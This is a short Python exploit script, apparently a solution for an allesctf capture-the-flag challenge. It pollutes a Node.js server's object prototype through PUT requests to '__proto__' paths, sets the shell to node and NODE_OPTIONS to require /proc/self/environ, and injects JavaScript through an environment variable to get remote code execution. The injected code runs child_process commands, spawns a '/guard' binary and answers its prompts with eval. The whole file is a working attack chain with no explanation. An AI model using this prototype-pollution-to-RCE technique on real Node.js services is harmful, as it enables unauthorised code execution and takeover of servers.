import requests
import sys

host = 'https://7b000000854fcf6809740484.challenges.broker5.allesctf.net:1337'

payload = """
c = require("child_process").spawn("/guard");
c.stdout.on("data", (d) => {
  a = d.toString();
  console.log(a);
  if (a.includes("+")) {
    c.stdin.write(eval(a.substring(0, a.length - 2)).toString() + String.fromCharCode(10));
  }
});//
""".replace("\n", "")

shell_data = {
    "value": "node"
}
cwd_data = {
    "value": "/tmp"
}
env_data = {
    "value":{
        #"aaaa": "console.log('1337');//",
        #"aaaa": "console.log(require('child_process').execSync('ls').toString());//",
        # Create ps.js to prevent error
        "aaaa":"require('child_process').execSync('echo \"console.log(1)\" > ps.js');console.log('Pass');//",
        "NODE_OPTIONS": "--require /proc/self/environ"
    }
}
guard_data = {
    "value":{
        "aaaa": payload,
        "NODE_OPTIONS": "--require /proc/self/environ"
    }
}
requests.put(host+'/api/directory/__proto__/shell', json=shell_data)
requests.put(host+'/api/directory/__proto__/cwd', json=cwd_data)
requests.put(host+'/api/directory/__proto__/env', json=env_data)
r = requests.get(host+'/_debug/stats')
print("RCE test: " + r.text)

requests.put(host+'/api/directory/__proto__/env', json=guard_data)
r = requests.get(host+'/_debug/stats')
print(r.text)